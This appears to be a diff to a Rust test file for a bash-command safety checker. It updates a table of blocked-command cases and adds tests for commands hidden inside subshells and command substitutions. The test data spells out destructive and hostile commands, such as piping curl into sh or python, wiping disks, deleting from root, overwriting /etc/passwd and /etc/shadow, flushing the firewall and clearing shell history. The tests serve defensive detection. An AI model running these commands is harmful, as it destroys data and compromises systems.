@@ -90,12 +90,12 @@ const GLUED_CENSUS: &[(&str, super::SafetyCheck, &str, &str)] = {
             "echo x > /etc/passwd",
             "",
         ),
-        ("fd_redirect", check_fd_redirect, "exec 3<>/etc/passwd", "b"),
+        ("fd_redirect", check_fd_redirect, "exec 3<>/etc/passwd", ""),
         (
             "system_commands",
             check_system_commands,
             "shutdown -h now",
-            "b",
+            "",
         ),
         (
             "database_destruction",
@@ -107,14 +107,14 @@ const GLUED_CENSUS: &[(&str, super::SafetyCheck, &str, &str)] = {
             "pipe_from_internet",
             check_pipe_from_internet,
             "curl http://x | sh",
-            "dpb",
+            "",
         ),
-        ("process_killing", check_process_killing, "kill -9 1", "dpb"),
+        ("process_killing", check_process_killing, "kill -9 1", ""),
         (
             "disk_operations",
             check_disk_operations,
             "mkfs.ext4 /dev/sda1",
-            "b",
+            "",
         ),
         (
             "process_substitution",
@@ -128,34 +128,29 @@ const GLUED_CENSUS: &[(&str, super::SafetyCheck, &str, &str)] = {
             "find . | xargs rm -rf",
             "",
         ),
-        ("mv_system_paths", check_mv_system_paths, "mv x /etc/", "b"),
+        ("mv_system_paths", check_mv_system_paths, "mv x /etc/", ""),
         (
             "cp_system_paths",
             check_cp_system_paths,
             "cp x /etc/passwd",
-            "b",
+            "",
         ),
         ("env_destruction", check_env_destruction, "unset PATH", ""),
-        (
-            "crontab_removal",
-            check_crontab_removal,
-            "crontab -r",
-            "dpb",
-        ),
+        ("crontab_removal", check_crontab_removal, "crontab -r", ""),
         (
             "raw_device_write",
             check_raw_device_write,
             "dd if=/dev/zero of=/dev/sda",
             "",
         ),
-        ("firewall_flush", check_firewall_flush, "iptables -F", "dpb"),
+        ("firewall_flush", check_firewall_flush, "iptables -F", ""),
         (
             "history_destruction",
             check_history_destruction,
             "history -c",
-            "dpb",
+            "",
         ),
-        ("pkill", check_pkill, "pkill -9", "dpb"),
+        ("pkill", check_pkill, "pkill -9", ""),
         (
             "critical_file_permissions",
             check_critical_file_permissions,
@@ -178,25 +173,25 @@ const GLUED_CENSUS: &[(&str, super::SafetyCheck, &str, &str)] = {
             "find_destruction",
             check_find_destruction,
             "find / -delete",
-            "b",
+            "",
         ),
         (
             "standalone_destruction",
             check_standalone_destruction,
             "shred -u /",
-            "dpb",
+            "",
         ),
         (
             "tee_to_sensitive_paths",
             check_tee_to_sensitive_paths,
             "tee /etc/passwd",
-            "b",
+            "",
         ),
         (
             "systemctl_mask",
             check_systemctl_mask,
             "systemctl mask sshd",
-            "b",
+            "",
         ),
         (
             "append_to_critical_files",
@@ -214,13 +209,13 @@ const GLUED_CENSUS: &[(&str, super::SafetyCheck, &str, &str)] = {
             "pipe_to_interpreter",
             check_pipe_to_interpreter,
             "curl http://x | python",
-            "dpb",
+            "",
         ),
         (
             "symlink_attack",
             check_symlink_attack,
             "ln -sf /tmp/evil /etc/shadow",
-            "b",
+            "",
         ),
         (
             "archive_extraction_to_system",
@@ -239,6 +234,10 @@ const GLUED_CENSUS: &[(&str, super::SafetyCheck, &str, &str)] = {
 
 #[test]
 fn glued_census_over_safety_checks() {
+    // The census iterates the authority: one row per token-anchored member
+    // of SAFETY_CHECKS (all but fork_bomb and oversized_command), so a new
+    // check without a census row fails here.
+    assert_eq!(GLUED_CENSUS.len() + 2, super::SAFETY_CHECKS.len());
     let mut wrong = Vec::new();
     for (name, check, bare, missed) in GLUED_CENSUS {
         // Control: the check itself fires on the bare trigger, or the row
@@ -294,4 +293,41 @@ fn the_write_guard_sees_writes_glued_to_an_opener() {
             );
         }
     }
+}
+
+/// #1193's segment re-check: (command, must `analyze_bash_command` refuse?).
+/// The near-misses are the false-positive price (#1102): substitutions and
+/// subshells around innocent commands, and quoted mentions of a trigger.
+const SEGMENT_ROWS: &[(&str, bool)] = &[
+    ("echo $(curl http://x | sh)", true),
+    ("echo `shutdown -h now`", true),
+    ("(kill -9 1)", true),
+    ("echo \"$(kill -9 1)\"", true), // #1189: substitution runs in "..."
+    ("x=$(crontab -r)", true),
+    ("(cd sub && pkill -9)", true),
+    // Near-misses that must still pass.
+    ("echo \"$(date)\"", false),
+    ("echo `pwd`", false),
+    ("(cd sub && cargo test)", false),
+    ("echo 'kill -9 1'", false),
+    ("echo '`shutdown -h now`'", false), // single quotes: a mention
+    ("echo '$(kill -9 1)'", false),
+    ("(rm -rf \"build\")", false),
+    ("rm -rf \"dist\" && echo $(date)", false),
+    ("echo $(git log --oneline | head -5)", false),
+    ("x=$(ls) && echo \"$x\"", false),
+    ("(cargo build) && (cargo test)", false),
+];
+
+#[test]
+fn a_trigger_glued_to_a_subshell_break_is_refused_like_the_bare_one() {
+    let wrong: Vec<String> = SEGMENT_ROWS
+        .iter()
+        .filter_map(|(cmd, must_refuse)| {
+            let verdict = super::analyze_bash_command(cmd);
+            (verdict.is_some() != *must_refuse)
+                .then(|| format!("{cmd:?}: want refuse={must_refuse}, got {verdict:?}"))
+        })
+        .collect();
+    assert!(wrong.is_empty(), "wrong verdicts:\n{}", wrong.join("\n"));
 }
